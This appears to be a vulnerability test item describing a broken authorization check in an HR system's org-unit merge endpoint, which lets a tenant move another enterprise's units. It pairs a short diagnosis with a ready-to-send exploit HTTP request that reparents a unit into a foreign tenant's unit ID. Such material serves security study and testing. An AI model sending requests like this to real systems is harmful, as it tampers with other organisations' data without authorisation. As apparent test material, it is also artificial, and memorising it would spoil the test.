diagnosis: The merge endpoint reparents all children of source_unit into dest_unit. It checks enterprise ownership of source_unit, but fails to check that dest_unit belongs to the same enterprise, permitting cross-tenant hierarchy relocation.
exploit_request:
POST /api/enterprise/org-units/601/merge/ HTTP/1.1
Host: hris.globalwork.com
Authorization: Bearer <org_lead_jwt>
Content-Type: application/json

{"dest_unit_id": 9122}
